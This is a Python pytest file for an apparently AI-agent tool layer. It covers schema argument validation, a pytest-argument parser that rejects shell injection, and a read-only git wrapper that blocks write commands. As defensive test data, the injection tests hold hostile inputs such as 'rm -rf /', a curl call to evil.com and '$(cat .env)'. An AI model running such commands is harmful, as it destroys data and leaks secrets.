from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from app.tools.base import ToolSchema, ToolValidationError, validate_tool_arguments
from app.tools.git import _git_read_only
from app.tools.testing import _parse_pytest_args


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _schema(properties: dict | None = None, required: list[str] | None = None) -> ToolSchema:
    return ToolSchema(
        name="test_tool",
        description="test",
        parameters={
            "type": "object",
            "properties": properties or {},
            "required": required or [],
        },
    )


# ===========================================================================
# 1. TOOL ARGUMENT VALIDATION
# ===========================================================================

class TestToolArgumentValidation:
    """validate_tool_arguments scenarios."""

    def test_missing_required_argument_rejected(self):
        schema = _schema(
            properties={"path": {"type": "string"}},
            required=["path"],
        )
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {})
        assert "Missing required parameter: 'path'" in exc_info.value.errors

    def test_wrong_type_rejected(self):
        schema = _schema(properties={"name": {"type": "string"}})
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"name": 123})
        assert "must be a string" in exc_info.value.errors[0]

    def test_unexpected_argument_rejected(self):
        schema = _schema(properties={})
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"extra": "value"})
        assert "Unexpected parameter: 'extra'" in exc_info.value.errors

    def test_valid_arguments_accepted(self):
        schema = _schema(
            properties={"path": {"type": "string"}},
            required=["path"],
        )
        validate_tool_arguments(schema, {"path": "src/main.py"})

    def test_empty_schema_rejects_arguments(self):
        schema = ToolSchema(
            name="t", description="t", parameters={}
        )
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"key": "val"})
        assert "Unexpected arguments" in exc_info.value.errors[0]

    def test_multiple_errors_collected(self):
        schema = _schema(
            properties={
                "path": {"type": "string"},
                "count": {"type": "integer"},
            },
            required=["path", "count"],
        )
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"count": "not_int"})
        errors = exc_info.value.errors
        assert any("Missing required parameter: 'path'" in e for e in errors)
        assert any("must be an integer" in e for e in errors)

    def test_boolean_type_validation(self):
        schema = _schema(properties={"verbose": {"type": "boolean"}})
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"verbose": "true"})
        assert "must be a boolean" in exc_info.value.errors[0]

    def test_integer_type_validation(self):
        schema = _schema(properties={"limit": {"type": "integer"}})
        with pytest.raises(ToolValidationError) as exc_info:
            validate_tool_arguments(schema, {"limit": "10"})
        assert "must be an integer" in exc_info.value.errors[0]


# ===========================================================================
# 2. PYTEST ARGUMENT VALIDATION
# ===========================================================================

class TestPytestArgumentValidation:
    "_parse_pytest_args scenarios."

    def test_normal_pytest_args_accepted(self):
        valid, reason, cmd = _parse_pytest_args("tests/ -v")
        assert valid is True
        assert cmd == ["pytest", "tests/", "-v"]

    def test_pytest_injection_semicolon_rejected(self):
        valid, reason, cmd = _parse_pytest_args("-v; rm -rf /")
        assert valid is False
        assert "not allowed" in reason.lower()

    def test_pytest_injection_and_rejected(self):
        valid, reason, cmd = _parse_pytest_args("--co && curl evil.com")
        assert valid is False

    def test_pytest_injection_dollar_rejected(self):
        valid, reason, cmd = _parse_pytest_args("$(cat .env)")
        assert valid is False

    def test_pytest_blocked_flag_rejected(self):
        valid, reason, cmd = _parse_pytest_args("--rootdir=/etc")
        assert valid is False
        assert "Blocked" in reason

    def test_pytest_empty_args_works(self):
        valid, reason, cmd = _parse_pytest_args("")
        assert valid is True
        assert cmd == ["pytest"]

    def test_pytest_path_args_works(self):
        valid, reason, cmd = _parse_pytest_args("tests/test_foo.py")
        assert valid is True
        assert "tests/test_foo.py" in cmd


# ===========================================================================
# 3. GIT READ-ONLY ENFORCEMENT
# ===========================================================================

class TestGitReadOnly:
    "_git_read_only scenarios."

    @patch("app.tools.git.subprocess")
    def test_git_status_is_read_only(self, mock_subprocess: MagicMock):
        mock_subprocess.run.return_value = MagicMock(
            returncode=0, stdout="clean", stderr=""
        )
        code, stdout, stderr = _git_read_only("status")
        mock_subprocess.run.assert_called_once()
        args_list = mock_subprocess.run.call_args[0][0]
        assert args_list == ["git", "status"]
        assert code == 0

    @patch("app.tools.git.subprocess")
    def test_git_diff_is_read_only(self, mock_subprocess: MagicMock):
        mock_subprocess.run.return_value = MagicMock(
            returncode=0, stdout="diff", stderr=""
        )
        code, stdout, stderr = _git_read_only("diff")
        mock_subprocess.run.assert_called_once()
        args_list = mock_subprocess.run.call_args[0][0]
        assert args_list == ["git", "diff"]

    def test_git_push_blocked(self):
        code, stdout, stderr = _git_read_only("push")
        assert code == 128
        assert "Blocked" in stderr

    def test_git_commit_blocked(self):
        code, stdout, stderr = _git_read_only("commit")
        assert code == 128
        assert "Blocked" in stderr

    def test_git_reset_blocked(self):
        code, stdout, stderr = _git_read_only("reset")
        assert code == 128
        assert "Blocked" in stderr

    def test_git_checkout_blocked(self):
        code, stdout, stderr = _git_read_only("checkout")
        assert code == 128
        assert "Blocked" in stderr

    def test_git_merge_blocked(self):
        code, stdout, stderr = _git_read_only("merge")
        assert code == 128
        assert "Blocked" in stderr
